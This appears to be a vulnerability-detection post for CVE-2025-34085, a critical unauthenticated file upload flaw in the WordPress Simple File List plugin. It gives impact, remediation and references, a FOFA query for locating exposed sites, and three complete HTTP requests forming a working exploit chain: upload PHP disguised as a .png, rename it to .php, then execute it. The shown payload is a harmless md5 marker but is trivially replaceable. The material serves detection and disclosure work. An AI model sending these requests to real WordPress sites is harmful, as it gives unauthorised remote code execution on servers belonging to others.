---
layout: post
cve_id: CVE-2025-34085
title: WordPress Simple File List <=4.2.2 - Remote Code Execution
pcap: true
pcap_path: /pcaps/2025/CVE-2025-34085.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2025/CVE-2025-34085.yaml
snort2_rule: N/A
snort3_rule: N/A
author: princechaddha
severity: critical
impact: 'Unauthenticated attackers can upload and execute PHP files by first uploading
  as .png then renaming to .php, achieving remote code execution on the WordPress
  server.

  '
remediation: 'Upgrade WordPress Simple File List plugin to version 4.2.3 or later
  that properly validates file extensions during rename operations.

  '
reference:
- https://wpscan.com/vulnerability/10192
- https://github.com/advisories/GHSA-8xp7-p66p-4h9h
- https://nvd.nist.gov/vuln/detail/CVE-2025-34085
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2025-34085
  cwe-id: CWE-434
metadata:
  verified: true
  max-request: 3
  fofa-query: body="/wp-content/plugins/simple-file-list/"
tags:
- cve
- cve2025
- wordpress
- wp-plugin
- wp
- rce
- file-upload
- intrusive
- simple-file-list
- vuln
---

## ðŸ” Vulnerability Description
An unrestricted file upload vulnerability in the WordPress Simple File List plugin before version 4.2.3 allows unauthenticated remote attackers to achieve remote code execution. The plugin's upload endpoint (ee-upload-engine.php) restricts file uploads based on extension, but lacks proper validation after file renaming. An attacker can first upload a PHP payload disguised as a .png file, then use the pluginâ€™s ee-file-engine.php rename functionality to change the extension to .php. This bypasses upload restrictions and results in the uploaded payload being executable on the server.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-content/plugins/simple-file-list/ee-upload-engine.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0
Connection: close
Content-Length: 695
Accept: */*
Content-Type: multipart/form-data; boundary=6985fa39c0698d07f6d418b37388e1b2
Accept-Encoding: gzip
--6985fa39c0698d07f6d418b37388e1b2
Content-Disposition: form-data; name="eeSFL_ID"
1
--6985fa39c0698d07f6d418b37388e1b2
Content-Disposition: form-data; name="eeSFL_FileUploadDir"
/wp-content/uploads/simple-file-list/
--6985fa39c0698d07f6d418b37388e1b2
Content-Disposition: form-data; name="eeSFL_Timestamp"
1587258885
--6985fa39c0698d07f6d418b37388e1b2
Content-Disposition: form-data; name="eeSFL_Token"
ba288252629a5399759b6fde1e205bc2
--6985fa39c0698d07f6d418b37388e1b2
Content-Disposition: form-data; name="file"; filename="bebbfai.png"
Content-Type: image/png
<?php echo md5("wordpress-rce-simplefilelist");unlink(__FILE__);?>
--6985fa39c0698d07f6d418b37388e1b2--
```

```nohighlight
POST /wp-content/plugins/simple-file-list/ee-file-engine.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Content-Length: 83
Accept: */*
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip
eeSFL_ID=1&eeFileOld=bebbfai.png&eeListFolder=%2F&eeFileAction=Rename%7Cbebbfai.php
```

```nohighlight
GET /wp-content/uploads/simple-file-list/bebbfai.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

